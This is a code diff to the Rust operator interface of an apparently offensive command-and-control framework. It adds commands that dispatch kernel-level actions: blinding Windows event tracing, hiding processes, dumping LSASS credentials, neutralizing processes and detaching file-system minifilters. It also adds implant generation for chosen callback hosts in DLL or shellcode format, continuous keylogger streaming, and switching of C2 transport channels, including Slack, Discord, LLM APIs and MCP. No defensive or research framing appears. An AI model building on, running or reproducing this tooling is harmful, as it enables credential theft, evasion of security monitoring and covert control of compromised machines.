@@ -2523,6 +2523,170 @@ impl MatchEvent for App {
                         }
                         return;
                     }
+                    // ── Kernel daemon ops (P6) — server-control API, no session
+                    // required. Mirrors TUI's `/driver-status`, `/blind-etw`,
+                    // `/hide <pid>`, `/dump-lsass <pid>`, `/neutralize <pid>`,
+                    // `/detach-mf`.
+                    "driver-status" => {
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::KernelStatus);
+                        }
+                        return;
+                    }
+                    "blind-etw" => {
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::KernelBlindEtw);
+                        }
+                        return;
+                    }
+                    "hide" => {
+                        let pid = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::KernelHide { pid });
+                        }
+                        return;
+                    }
+                    "dump-lsass" => {
+                        let pid = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::KernelDumpLsass { pid });
+                        }
+                        return;
+                    }
+                    "neutralize" => {
+                        let pid = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::KernelNeutralize { pid });
+                        }
+                        return;
+                    }
+                    "detach-mf" => {
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::KernelDetachMinifilter);
+                        }
+                        return;
+                    }
+                    // ── Implant generation — server-control API, no session.
+                    // Mirrors TUI's `/generate`, `/implants`, `/revoke`.
+                    "generate" => {
+                        // generate <callback> [port] [--sleep N] [--jitter N]
+                        //           [--tls/--no-tls] [--format dll|shellcode]
+                        if parts.len() < 2 {
+                            LOG_LINES.write().unwrap().push(
+                                "usage: generate <callback> [port] [--sleep N] [--jitter N] [--format dll|shellcode]".into(),
+                            );
+                            return;
+                        }
+                        let callback = parts[1].to_string();
+                        let mut port: u16 = 8443;
+                        let mut sleep: u32 = 60;
+                        let mut jitter: u8 = 20;
+                        let mut tls = true;
+                        let mut format = "dll".to_string();
+                        let mut i = 2;
+                        while i < parts.len() {
+                            match parts[i] {
+                                "--sleep" => {
+                                    i += 1;
+                                    if let Some(v) = parts.get(i).and_then(|s| s.parse().ok()) {
+                                        sleep = v;
+                                    }
+                                }
+                                "--jitter" => {
+                                    i += 1;
+                                    if let Some(v) = parts.get(i).and_then(|s| s.parse().ok()) {
+                                        jitter = v;
+                                    }
+                                }
+                                "--tls" => tls = true,
+                                "--no-tls" => tls = false,
+                                "--format" => {
+                                    i += 1;
+                                    if let Some(f) = parts.get(i) {
+                                        format = f.to_string();
+                                    }
+                                }
+                                _ => {
+                                    if let Ok(p) = parts[i].parse::<u16>() {
+                                        port = p;
+                                    }
+                                }
+                            }
+                            i += 1;
+                        }
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::GenerateImplant {
+                                callback,
+                                port,
+                                format,
+                                uri: "/beacon".into(),
+                                sleep,
+                                jitter,
+                                tls,
+                                features: 0,
+                            });
+                        }
+                        return;
+                    }
+                    "implants" => {
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::FetchImplants);
+                        }
+                        return;
+                    }
+                    "revoke" => {
+                        let pk = parts.get(1).copied().unwrap_or("").to_string();
+                        if pk.is_empty() {
+                            LOG_LINES
+                                .write()
+                                .unwrap()
+                                .push("usage: revoke <implant_pub>".into());
+                            return;
+                        }
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::RevokeImplant { implant_pub: pk });
+                        }
+                        return;
+                    }
+                    "channel" => {
+                        // channel with no arg → list available channels (no
+                        // session needed). With an arg it falls through to the
+                        // session-bound Layer 3 handler that sends SetChannel.
+                        if parts.len() < 2 {
+                            LOG_LINES
+                                .write()
+                                .unwrap()
+                                .push("C2 transport channels:".into());
+                            for line in [
+                                "  0 https   - HTTPS POST (default)",
+                                "  1 doh     - DNS-over-HTTPS",
+                                "  2 dns     - DNS beacon",
+                                "  3 smb     - SMB Named Pipe (pivot)",
+                                "  4 tcp     - TCP Beacon (pivot)",
+                                "  5 slack   - External C2 via Slack",
+                                "  6 llm     - External C2 via LLM API",
+                                "  7 mcp     - External C2 via MCP",
+                                "  8 discord - External C2 via Discord",
+                            ] {
+                                LOG_LINES.write().unwrap().push(line.into());
+                            }
+                            LOG_LINES.write().unwrap().push(
+                                "usage: channel <id|name>  e.g. channel doh".into(),
+                            );
+                            return;
+                        }
+                        // Has an argument → fall through to Layer 3 (needs a
+                        // selected session to switch the channel on).
+                    }
                     _ => {}
                 }
 
@@ -2615,16 +2779,36 @@ impl MatchEvent for App {
                                     name: parts.get(1).copied().unwrap_or("").to_string(),
                                 },
                                 "keylog" => {
+                                    // keylog [start|stop|dump|stream [secs]|unstream]
+                                    // `stream`/`unstream` are continuous-dump controls;
+                                    // start/stop/dump are the one-shot actions.
                                     let action_str = parts.get(1).copied().unwrap_or("start");
-                                    let action = match action_str {
-                                        "start" => 0,
-                                        "stop" => 1,
-                                        "dump" => 2,
-                                        _ => 0,
-                                    };
-                                    Cmd::Keylog {
-                                        session: sid.clone(),
-                                        action,
+                                    if action_str == "stream"
+                                        || action_str.starts_with("stream")
+                                    {
+                                        let secs: u32 = parts
+                                            .get(2)
+                                            .and_then(|s| s.parse().ok())
+                                            .unwrap_or(5);
+                                        Cmd::KeylogStreamStart {
+                                            session: sid.clone(),
+                                            interval_secs: secs,
+                                        }
+                                    } else if action_str == "unstream" {
+                                        Cmd::KeylogStreamStop {
+                                            session: sid.clone(),
+                                        }
+                                    } else {
+                                        let action = match action_str {
+                                            "start" => 0,
+                                            "stop" => 1,
+                                            "dump" => 2,
+                                            _ => 0,
+                                        };
+                                        Cmd::Keylog {
+                                            session: sid.clone(),
+                                            action,
+                                        }
                                     }
                                 }
                                 "hashdump" => {
@@ -2776,6 +2960,40 @@ impl MatchEvent for App {
                                         pid,
                                         spawn_to,
                                         sc_hex,
+                                    }
+                                }
+                                "trex" => Cmd::Trex {
+                                    session: sid.clone(),
+                                },
+                                "channel" => {
+                                    // channel <id|name> — set C2 transport on the
+                                    // selected session. The no-arg help listing is
+                                    // handled in Layer 2 (no session required).
+                                    let arg = parts.get(1).copied().unwrap_or("");
+                                    let ch: u8 = if let Ok(n) = arg.parse::<u8>() {
+                                        n
+                                    } else {
+                                        match arg.to_ascii_lowercase().as_str() {
+                                            "https" | "http" => 0,
+                                            "doh" | "dohdns" | "doh-dns" => 1,
+                                            "dns" => 2,
+                                            "smb" | "smbpipe" | "smb-pipe" | "pipe" => 3,
+                                            "tcp" => 4,
+                                            "slack" | "slackapi" | "slack-api" => 5,
+                                            "llm" | "llmapi" | "llm-api" => 6,
+                                            "mcp" => 7,
+                                            "discord" | "discordapi" | "discord-api" => 8,
+                                            _ => {
+                                                LOG_LINES.write().unwrap().push(format!(
+                                                    "! unknown channel '{arg}'. channel for list."
+                                                ));
+                                                0
+                                            }
+                                        }
+                                    };
+                                    Cmd::SetChannel {
+                                        session: sid.clone(),
+                                        channel: ch,
                                     }
                                 }
                                 "chan" => {
